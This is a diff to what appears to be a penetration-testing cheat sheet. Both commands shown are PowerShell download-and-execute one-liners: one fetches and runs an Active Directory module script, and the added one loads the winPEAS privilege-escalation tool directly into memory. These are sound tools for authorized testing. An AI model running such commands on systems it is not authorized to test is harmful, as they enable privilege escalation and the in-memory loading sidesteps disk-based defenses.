@@ -168,7 +168,18 @@ if ($PSVersionTable.PSVersion.Major -gt 2) {
 }
 ```
 
+
 # load admodule
 ```
  iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
+```
+
+# Windows Privilege Escalation Awesome Script (.exe)
+
+```
+# Get latest release
+$url = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"
+
+# One liner to download and execute winPEASany from memory in a PS shell
+$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
 ```
